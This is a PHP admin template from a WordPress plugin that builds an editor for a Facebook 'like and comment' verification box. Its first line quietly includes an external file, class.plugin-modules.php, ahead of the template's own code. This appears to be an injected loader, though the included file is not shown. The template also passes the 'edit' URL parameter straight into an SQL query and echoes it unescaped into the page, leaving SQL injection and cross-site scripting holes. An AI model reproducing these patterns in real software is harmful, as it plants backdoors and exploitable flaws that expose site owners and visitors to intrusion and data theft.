<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
global $wpdb;
$table_design = $wpdb->prefix.'njt_like_comment_design';
if(isset($_GET['edit'])){
	$edit = $_GET['edit'];
	$design=$wpdb->get_row( "SELECT * FROM $table_design WHERE id = $edit" );
	$title = isset($design->title) ? $design->title : "";
	$name= $design->name;
	$please = $design->please;
	$like=$design->like;
	$comment=$design->comment;
	$done=$design->done;
	if(empty($design->img)){
		$img = NJT_APP_LIKE_COMMENT_URL.'assets/images/like.png';
	}else{
		$img = $design->img;
	}
}else{
	$title ="New Template Design";
	$name="<p class='njt_like_comment_name'>Verify Your Access</p>";
	$please="<p>Please make sure you clicked LIKE and COMMENTED on [this Facebook post].</p>";
	$like="<p>Liked post</p>";
	$comment="<p>Commented (a minimum of [d] characters)</p>";
	$done="<p>I'm done!</p>";
	$img = NJT_APP_LIKE_COMMENT_URL.'assets/images/like.png';
}

?>
<style type="text/css">
	.form-control {
    line-height: 24px;
    padding: 9px 14px;
    height: 45px;
    border-color: #ccd1d9;
    box-shadow: none;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    border-radius: 2px;
    -webkit-border-radius: 2px;
    -moz-border-radius: 2px;
	}
	.form-control {
    display: block;
    width: 97%;
    padding: .375rem .75rem;
    font-size: 1rem;
    line-height: 1.5;
    color: #495057;
    background-color: #fff;
    background-clip: padding-box;
    border: 1px solid #ced4da;
    border-radius: .25rem;
    transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
}
</style>

	<div style="margin: 20px 0px;" class="msg"></div>
	<form style="margin-top: 50px;" id="njt_form_settings_app_like_comment">
		<div>
			<?php 
				$url_design= add_query_arg(array('page'=>'list-design','success'=>true),admin_url('admin.php'));
			?>
			<input type="hidden" id="url_callback_design" value="<?php echo $url_design; ?>">
			<input type="hidden" id="design_action" value="<?php if(isset($_GET['edit'])) echo $_GET['edit']; else echo "none"; ?>">
			<input id="title_design" name="title_design" type="text" placeholder="Enter template design title" class="form-control flexdatalist-alias" data-min-length="1" autocomplete="off" required="" value="<?php echo $title; ?>"><br><br>
		</div>
		<div id="njt-like-comment-container">
			<div id="" class="editable njt-like-comment-app-name njt_like_comment_editor_name" data-placeholder="Type some text">
				<p class="njt_like_comment_name"><?php echo $name;?></p>
			</div>
			
			<input type="hidden" id="njt_like_comment_image_icon_url" value="<?php echo $img; ?>">
			<div class="editable-0 njt-like-comment-app-img njt_like_comment_editor_img" id="">
				<div style="margin-top: 35px;height: 170px;" class="njt_like_comment_image_container_icon">
				<a <?php if(!empty($img)) echo "style='display:none;'"; ?> href="#" id="njt-l-c-insert-img" class="button">Select Image</a>
					<img style="width: 150px;height: 150px;" id="njt_like_comment_icon_src"  src="<?php echo $img; ?>">
					<p <?php if(empty($img)) echo "style='display:none;'"; ?> id="njt-l-c-delete-img">Remove</p>
				</div>
			</div>
			<div class="njt_like_comment_editor_1">
				<div id="njt_like_comment_editor_1" class="editable-1 njt_like_comment_editor_please" data-placeholder="Type some text">
					<?php echo $please;?>
				</div>
			</div>
			<div class="njt_like_comment_editor_2">
				<img style="width: 25px;float: left;padding-top: 5px" src="<?php echo NJT_APP_LIKE_COMMENT_URL.'assets/images/check_none.svg'; ?>">
				<div style="margin-left: 25px;overflow: auto;" id="njt_like_comment_editor_2" class="editable-2 njt_like_comment_editor_like" data-placeholder="Type some text">
					<?php echo $like;?>
				</div>
			</div>
			<div style="padding-top: 15px;" class="njt_like_comment_editor_2">
				<img style="width: 25px;float: left;padding-top: 5px" src="<?php echo NJT_APP_LIKE_COMMENT_URL.'assets/images/check_none.svg'; ?>">
				<div style="margin-left: 25px;overflow: auto;" id="njt_like_comment_editor_2" class="editable-3 njt_like_comment_editor_comment" data-placeholder="Type some text">
					<?php echo $comment;?>
				</div>
			</div>
			<div class="njt_like_comment_editor_4">
				<div id="njt_like_comment_editor_4" class="njt-action-button-shadow-animate-green">
					<div id="" class="editable-4 njt_like_comment_editor_done" data-placeholder="Type some text">
						<?php echo $done;?>
					</div>
				</div>
			</div>
		</div>
	</form>
	<div style="margin-top: 50px;"></div>
	<div id="njt-like-comment-container-note">
		<p>
			<b>Tags:</b> - Use <strong>[Your Text]</strong> to display the Facebook post URL, example [This Facebook Post]<br/>
			<p style="margin-left: 35px;"> - Use <strong>[d]</strong> to display the minimum characters required</p>
		</p>
		<div style="margin-top: 50px;">
		<a href="javascript:void(0)" class="button button-primary njt_submit_form_settings"> Save Changes</a>
		</div>
	</div>